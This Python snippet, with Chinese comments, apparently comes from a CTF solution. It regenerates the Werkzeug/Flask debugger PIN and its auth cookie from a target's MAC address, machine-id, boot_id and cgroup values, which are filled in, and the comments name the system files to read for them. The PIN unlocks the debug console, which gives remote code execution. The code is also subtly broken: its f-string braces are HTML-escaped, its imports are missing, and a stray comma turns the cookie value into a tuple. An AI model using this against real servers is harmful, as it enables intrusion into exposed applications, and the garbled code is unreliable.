def get_pin_and_cookie_name() :

    rv = None
    num = None
    probably_public_bits = [
        'app',
        'flask.app',
        'Flask',
        '/usr/lib/python3.8/site-packages/flask/app.py'
    ]

    private_bits = [
        '2485378023426', #  /sys/class/net/eth0/address 16进制转10进制
        #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
        '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'
    ]


    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器
        if not bit:                                        #遍历其中的所有元素
            continue
        if isinstance(bit, str):#判断它是否为字符串类型
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd&#123;h.hexdigest()[:20]&#125;"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"&#123;int(h.hexdigest(), 16):09d&#125;"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    cookie_value = f"&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;",
    print(cookie_value)
